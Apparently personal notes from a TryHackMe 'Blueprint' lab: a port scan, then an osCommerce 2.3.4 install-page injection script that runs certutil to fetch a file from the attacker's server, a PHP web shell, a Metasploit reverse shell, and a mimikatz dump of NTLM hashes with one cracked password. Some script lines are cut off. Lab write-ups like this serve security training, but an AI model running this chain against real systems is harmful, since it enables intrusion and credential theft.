[https://fr33s0ul.tech/blueprint-tryhackme-write-up/](https://fr33s0ul.tech/blueprint-tryhackme-write-up/)

[https://r4bb1t.medium.com/blueprint-write-up-60e67cdab5d5](https://r4bb1t.medium.com/blueprint-write-up-60e67cdab5d5)

https://infosecwriteups.com/blueprint-walkthrough-metasploit-b37964edfe0c

This has a weird PHP instance and a forgotten install page that allows us to instantiate a new DB and start the exploit process..

### Enumeration
```bash
┌──(sstephens㉿kali-ppt)-[~]
└─$ rustscan -a 10.10.117.48               
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TreadStone was here 🚀

[~] The config file is expected to be at "/home/sstephens/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.117.48:80
Open 10.10.117.48:135
Open 10.10.117.48:139
Open 10.10.117.48:443
Open 10.10.117.48:445
Open 10.10.117.48:3306
Open 10.10.117.48:8080
Open 10.10.117.48:49152
Open 10.10.117.48:49153                                                     
Open 10.10.117.48:49154                                                     
Open 10.10.117.48:49158                                                     
Open 10.10.117.48:49159                                                     
Open 10.10.117.48:49160                                                     
[~] Starting Script(s)                                                      
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-09 16:26 EDT
Initiating Ping Scan at 16:26
Scanning 10.10.117.48 [2 ports]
Completed Ping Scan at 16:26, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:26
Completed Parallel DNS resolution of 1 host. at 16:26, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 16:26
Scanning 10.10.117.48 [13 ports]
Discovered open port 443/tcp on 10.10.117.48
Discovered open port 8080/tcp on 10.10.117.48
Discovered open port 445/tcp on 10.10.117.48
Discovered open port 135/tcp on 10.10.117.48
Discovered open port 3306/tcp on 10.10.117.48
Discovered open port 139/tcp on 10.10.117.48
Discovered open port 80/tcp on 10.10.117.48
Discovered open port 49154/tcp on 10.10.117.48
Discovered open port 49158/tcp on 10.10.117.48
Discovered open port 49159/tcp on 10.10.117.48
Discovered open port 49153/tcp on 10.10.117.48
Discovered open port 49152/tcp on 10.10.117.48
Discovered open port 49160/tcp on 10.10.117.48
Completed Connect Scan at 16:26, 1.38s elapsed (13 total ports)
Nmap scan report for 10.10.117.48
Host is up, received syn-ack (0.095s latency).
Scanned at 2024-08-09 16:26:56 EDT for 2s

PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack
135/tcp   open  msrpc        syn-ack
139/tcp   open  netbios-ssn  syn-ack
443/tcp   open  https        syn-ack
445/tcp   open  microsoft-ds syn-ack
3306/tcp  open  mysql        syn-ack
8080/tcp  open  http-proxy   syn-ack
49152/tcp open  unknown      syn-ack
49153/tcp open  unknown      syn-ack
49154/tcp open  unknown      syn-ack
49158/tcp open  unknown      syn-ack
49159/tcp open  unknown      syn-ack
49160/tcp open  unknown      syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.50 seconds
```


Navigate to web page
![[Pasted image 20240809162924.png]]


![[Pasted image 20240809162933.png]]

### Exploitation
Craft the RCE payloads
**44374.py**
```python 
import requests

# enter the the target url here, as well as the url to the install.php (Do >
base_url = "http://10.10.178.33:8080/oscommerce-2.3.4/catalog/"
target_url = "http://10.10.178.33:8080/oscommerce-2.3.4/catalog/install/ins>

data = {
    'DIR_FS_DOCUMENT_ROOT': './'
}

# the payload will be injected into the configuration file via this code
# '  define(\'DB_DATABASE\', \'' . trim($HTTP_POST_VARS['DB_DATABASE']) . '>
# so the format for the exploit will be: '); PAYLOAD; /*

payload = '\');'
payload += '$var = shell_exec("cmd.exe /C certutil -urlcache -split -f http>
payload += 'echo $var;'
payload += '/*'


data['DB_DATABASE'] = payload

# exploit it
r = requests.post(url=target_url, data=data)

if r.status_code == 200:
    print("[+] Successfully launched the exploit. Open the following URL to>
else:
    print("[-] Exploit did not execute as planned")
```

Craft the initial payload for testing and follow-up
**shell.php**
```php
<?php passthru($_GET["cmd"]);?>
```

Start a web server to serve the files:
```bash
┌──(sstephens㉿kali-ppt)-[~/Documents/tryhackme/blueprint]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```


Run the exploit
```bash
┌──(sstephens㉿kali-ppt)-[~/Documents/tryhackme/blueprint]
└─$ python 44374.py
[+] Successfully launched the exploit. Open the following URL to execute your code

http://10.10.178.33:8080/oscommerce-2.3.4/catalog/install/includes/configure.php
```

Now we can check our permissions
**nt authority\system** == SYSTEM
![[Pasted image 20240809175042.png]]

We need reverse shell to wrap it up. Open MSFconsole and do the following
```bash
use multi/script/web_delivery
set lhost 10.11.93.71
set payload windows/meterpreter/reverse_tcp
set target 3
run
```

Once the meterpreter session establishes perform the following:
```
meterpreter > shell
Process 3460 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes>cd ~/
cd ~/
The system cannot find the path specified.

C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes>cd C:\Users
cd C:\Users

C:\Users>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 14AF-C52C

 Directory of C:\Users

04/11/2019  11:36 PM    <DIR>          .
04/11/2019  11:36 PM    <DIR>          ..
04/11/2019  11:40 PM    <DIR>          Administrator
03/21/2017  04:30 PM    <DIR>          DefaultAppPool
03/21/2017  04:09 PM    <DIR>          Lab
07/14/2009  05:41 AM    <DIR>          Public
               0 File(s)              0 bytes
               6 Dir(s)  19,508,789,248 bytes free

C:\Users>cd Administrator
cd Administrator

C:\Users\Administrator>cd Desktop
dicd Desktop

C:\Users\Administrator\Desktop>r
dir
 Volume in drive C has no label.
 Volume Serial Number is 14AF-C52C

 Directory of C:\Users\Administrator\Desktop

11/27/2019  07:15 PM    <DIR>          .
11/27/2019  07:15 PM    <DIR>          ..
11/27/2019  07:15 PM                37 root.txt.txt
               1 File(s)             37 bytes
               2 Dir(s)  19,508,789,248 bytes free

C:\Users\Administrator\Desktop>type root.txt.txt
type root.txt.txt
THM{aea1e3ce6fe7f89e10cea833ae009bee}
C:\Users\Administrator\Desktop>exit
exit
meterpreter > load mimikatz
[!] The "mimikatz" extension has been replaced by "kiwi". Please use this in future.
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping SAM
Domain : BLUEPRINT
SysKey : 147a48de4a9815d2aa479598592b086f
Local SID : S-1-5-21-3130159037-241736515-3168549210

SAMKey : 3700ddba8f7165462130a4441ef47500

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 549a1bcb88e35dc18c7a0b0168631411

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : Lab
  Hash NTLM: 30e87bf999828446a1c1209ddde4c450

meterpreter >    
```

Cracked on crackstation. googleplus
#TODO figure out wordlist to use for john
